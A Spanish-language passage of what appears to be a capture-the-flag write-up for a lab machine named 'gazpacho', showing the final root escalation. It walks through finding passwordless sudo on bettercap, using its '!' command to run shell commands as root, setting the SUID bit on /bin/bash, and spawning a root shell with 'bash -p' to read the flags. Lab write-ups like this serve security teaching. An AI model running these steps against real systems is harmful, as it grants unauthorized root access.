tomate@gazpacho:/home/pepino$ whoami
tomate
tomate@gazpacho:/home/pepino$ cd ../tomate/
tomate@gazpacho:~$
```
Ahora somos el **usuario tomate**.

Aquí encontraremos la flag del usuario, pero no la podremos ver, pues solo el **Root** puede verla:
```bash
-rw-r--r-- 1 tomate tomate  807 abr 23  2023 .profile
-r-------- 1 root   root     33 abr 29  2024 user.txt
```

### Abusando de Privilegios Sobre Binario bettercap para Escalar Privilegios y Convertirnos en Usuario root {#bettercap}

Directamente, veamos qué privilegios tiene este usuario:
```bash
tomate@gazpacho:~$ sudo -l
Matching Defaults entries for tomate on gazpacho:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User tomate may run the following commands on gazpacho:
    (root) NOPASSWD: /usr/bin/bettercap
```
Podemos usar el **binario bettercap** como el **usuario Root**.

Es el mismo binario que ya habíamos encontrado y que podemos ver su ruta:
```bash
tomate@gazpacho:~$ which bettercap
/usr/bin/bettercap
```

Investiguemos un poco sobre este binario:

| **Bettercap** |
|:-----------:|
| *Bettercap es una herramienta poderosa y versátil para realizar ataques de red y pruebas de seguridad ofensivas. Se utiliza principalmente para sniffing, manipulación de tráfico en tiempo real, ataques Man-in-the-Middle (MITM) y mucho más. Bettercap es como el cuchillo suizo del pentester de redes.* |

Aquí puedes ver la documentación de la herramienta:
* <a href="https://www.bettercap.org/legacy/" target="_blank">BetterCap - Documentation</a>

Al ejecutar el binario, entraremos en una consola de comandos:
```bash
tomate@gazpacho:~$ sudo bettercap
bettercap v2.32.0 (built for linux amd64 with go1.19.8) [type 'help' for a list of commands]

192.168.10.0/24 > 192.168.10.150  » [00:52:15] [sys.log] [war] Could not find mac for
```

Y si usamos el comando **help**, veremos una forma de escalar privilegios:
```bash
192.168.10.0/24 > 192.168.10.150  » help

           help MODULE : List available commands or show module specific help if no module name is provided.
                active : Show information about active modules.
                  quit : Close the session and exit.
         sleep SECONDS : Sleep for the given amount of seconds.
              get NAME : Get the value of variable NAME, use * alone for all, or NAME* as a wildcard.
        set NAME VALUE : Set the VALUE of variable NAME.
  read VARIABLE PROMPT : Show a PROMPT to ask the user for input that will be saved inside VARIABLE.
                 clear : Clear the screen.
        include CAPLET : Load and run this caplet in the current session.
             ! COMMAND : Execute a shell command and print its output.
        alias MAC NAME : Assign an alias to a given endpoint given its MAC address.
...
```
Podemos ejecutar comandos desde esta terminal y, como la ejecutamos como **Root**, entonces, todo lo que ejecutemos, tendrá privilegios máximos.

Veamos qué usuario somos dentro de esta terminal:
```bash
192.168.10.0/24 > 192.168.10.150  » !whoami
root
```
Funciona bien.

Asignémosle **permisos SUID** a la **Bash**, para poder ejecutarla con privilegios de **Root** desde cualquier usuario:
```bash
192.168.10.0/24 > 192.168.10.150  » !chmod u+s /bin/bash

192.168.10.0/24 > 192.168.10.150  » exit
tomate@gazpacho:~$
```

Chequemos si se hizo el cambio:
```bash
tomate@gazpacho:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 abr 23  2023 /bin/bash
```
Ahí está, si se cambiaron los permisos.

Usemos la **Bash** con privilegios y obtengamos las flags:
```bash
tomate@gazpacho:~$ bash -p
bash-5.2# whoami
root
bash-5.2# cat /home/tomate/user.txt
...
bash-5.2# cat /root/root.txt
...
```
Y con esto, terminamos la máquina.
